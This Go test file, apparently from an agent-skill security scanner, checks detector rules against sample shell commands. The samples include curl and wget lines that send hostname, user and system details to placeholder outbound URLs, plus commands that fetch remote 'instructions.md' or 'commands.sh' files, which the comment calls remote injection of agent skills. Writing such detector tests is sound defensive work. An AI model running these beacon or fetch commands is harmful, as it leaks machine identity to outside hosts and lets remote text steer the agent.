// SPDX-License-Identifier: MIT
package detect

import (
	"testing"

	"github.com/basdotio/AgentGuard/internal/model"
)

// TestDetect_BeaconAndRemoteInstructions: two remote-control shapes passed the gate with no
// finding at all. A beacon puts the machine's identity into an outbound URL — `?h=$(hostname)` — which
// is reconnaissance leaving; EXFIL-001 cannot see it because the host name is not a credential. And a
// skill that curls a file named `instructions.md` and acts on it is remote injection. Both are high.
// The quiet table is the precision half: a constant query parameter, `$(hostname)` that does not go
// into a URL, and a fetch of a file not named like instructions must stay silent.
func TestDetect_BeaconAndRemoteInstructions(t *testing.T) {
	beacon := []string{
		"curl -s https://insights.telemetry.example/beacon?h=$(hostname) >/dev/null",
		"curl -s https://x.example/hello?u=$USER&h=$(hostname) 2>/dev/null &",
		"wget -q https://x.example/p?id=$(whoami) -O /dev/null",
		"curl https://x.example/collect?u=$(id -un)",
		`curl "https://x.example/r?k=$(uname -a)"`,
	}
	for _, cmd := range beacon {
		t.Run("beacon/"+cmd, func(t *testing.T) {
			f, ok := findingsFor(t, map[string]string{"s.sh": cmd + "\n"})["EXFIL-007"]
			if !ok {
				t.Fatalf("EXFIL-007 missing on %q; got %v", cmd, keys(findingsFor(t, map[string]string{"s.sh": cmd + "\n"})))
			}
			if f.Severity != model.SevHigh || f.Dimension != 3 {
				t.Errorf("EXFIL-007 = %s / dim %d, want high / 3", f.Severity, f.Dimension)
			}
		})
	}
	fetch := []string{
		"curl -s https://cdn.templates.example/instructions.md | tee /tmp/i.md",
		"wget https://x.example/steps.txt",
		"curl https://x.example/agent/commands.sh -o /tmp/c.sh",
		"fetch https://x.example/payload.json",
	}
	for _, cmd := range fetch {
		t.Run("fetch/"+cmd, func(t *testing.T) {
			f, ok := findingsFor(t, map[string]string{"s.sh": cmd + "\n"})["INJ-005"]
			if !ok {
				t.Fatalf("INJ-005 missing on %q; got %v", cmd, keys(findingsFor(t, map[string]string{"s.sh": cmd + "\n"})))
			}
			if f.Severity != model.SevHigh || f.Dimension != 1 {
				t.Errorf("INJ-005 = %s / dim %d, want high / 1", f.Severity, f.Dimension)
			}
		})
	}
	quiet := []struct{ id, cmd string }{
		{"EXFIL-007", "curl https://api.example/data?id=42"},
		{"EXFIL-007", "echo host is $(hostname)"},
		{"EXFIL-007", "HOST=$(hostname); echo $HOST"},
		{"INJ-005", "curl https://x.example/readme.md -o README.md"},
		{"INJ-005", "curl https://api.example/v1/status"},
		{"INJ-005", "const r = await fetch(`http://127.0.0.1:${port}/command`, { method: \"POST\" })"},
	}
	for _, q := range quiet {
		t.Run("quiet/"+q.cmd, func(t *testing.T) {
			if _, ok := findingsFor(t, map[string]string{"s.sh": q.cmd + "\n"})[q.id]; ok {
				t.Errorf("%s fired on %q", q.id, q.cmd)
			}
		})
	}
}
